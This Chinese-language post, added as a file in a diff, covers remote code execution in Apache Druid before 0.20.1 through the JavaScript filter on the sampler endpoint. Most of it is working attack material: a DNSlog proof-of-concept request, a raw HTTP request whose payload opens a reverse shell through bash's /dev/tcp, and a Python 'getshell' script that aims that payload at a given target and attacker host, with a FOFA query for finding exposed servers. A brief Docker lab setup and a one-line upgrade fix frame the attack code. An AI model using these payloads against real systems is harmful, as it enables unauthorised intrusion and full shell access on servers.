@@ -1,0 +1,96 @@
+## **漏洞概述**
+
+Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。  
+Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。
+
+##  **影响版本**
+
+    
+    
+    Apache Druid < 0.20.1
+
+##  **环境搭建**
+
+这里使用docker来搭建
+
+拉取镜像并启动Apache Druid:0.16.0版本的环境
+
+    
+    
+    dockerpull fokkodriesprong/docker-druid dockerrun --rm -i -p 8888:8888 fokkodriesprong/docker-druid
+
+启动访问：your-ip:8888即可看到页面
+
+![1612421655_601b9a17e342d24be8f12.png!small](https://image.3001.net/images/20210204/1612421655_601b9a17e342d24be8f12.png!small)
+
+漏洞复现poc（dnslog）
+
+    
+    
+    POST /druid/indexer/v1/sampler HTTP/1.1
+    Host: ip:prot
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
+    Accept: application/json, text/plain, */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Content-Type: application/json
+    Content-Length: 1045
+    Connection: close
+    
+    {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping du19dx.dnslog.cn')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
+
+getshell poc
+
+    
+    
+    POST /druid/indexer/v1/sampler HTTP/1.1 Host: ip:prot User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1045 Connection: close {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2020-12-12T12:10:21.040Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/ip/port 0>&1')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
+
+python getshell 脚本（python3）
+
+    
+    
+    #coding:utf-8
+    #!/usr/bin/python3
+    #author:HADESI
+    # fofa 搜索语法title="Apache Druid"
+    
+    import requests,sys,re,json
+    
+    
+    if len(sys.argv)<3:
+        print("[+]Use: pyhton3 Apache Druid getshell http://ip:port vps/port")
+        print("[+]Use: pyhton3 Apache Druid getshell http://ip:port 192.168.1.1/8888")
+        print("[+]Explain: HADESI")
+        print("[+]============================================================")
+        sys.exit()
+    
+    def HADESI():
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+            "Content-Type": "application/json"
+        }
+        payload = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["https://druid.apache.org/data/example-manifests.tsv"]},"inputFormat":{"type":"tsv","findColumnsFromHeader":"true"}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"timestamp","missingValue":"2010-01-01T00:00:00Z"},"dimensionsSpec":{},"transformSpec":{"transforms":[],"filter":{"type": "javascript","function": "function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/"+sys.argv[2]+" 0>&1')}","dimension": "added","": {"enabled": "true"}}}},"type":"index","tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":50,"timeoutMs":10000}}
+        url=sys.argv[1]+"/druid/indexer/v1/sampler"
+        rr = requests.post(url=url,headers=headers,data=json.dumps(payload))
+        # print(payload)
+        if rr.status_code == 200:
+            print("漏洞存在，已反弹shell")
+        else:
+            print(rr.status_code+"漏洞不存在")
+    
+    if __name__ == '__main__':
+            HADESI()
+
+![1612422084_601b9bc42063da00104e8.png!small](https://image.3001.net/images/20210204/1612422084_601b9bc42063da00104e8.png!small)
+
+![1612422172_601b9c1cc5eb80ff305e5.png!small](https://image.3001.net/images/20210204/1612422172_601b9c1cc5eb80ff305e5.png!small)
+
+##  **修复建议**
+
+更新Apache Druid
+
+https://druid.apache.org/downloads.html
+
+https://github.com/apache/druid/releases/tag/druid-0.20.1
+
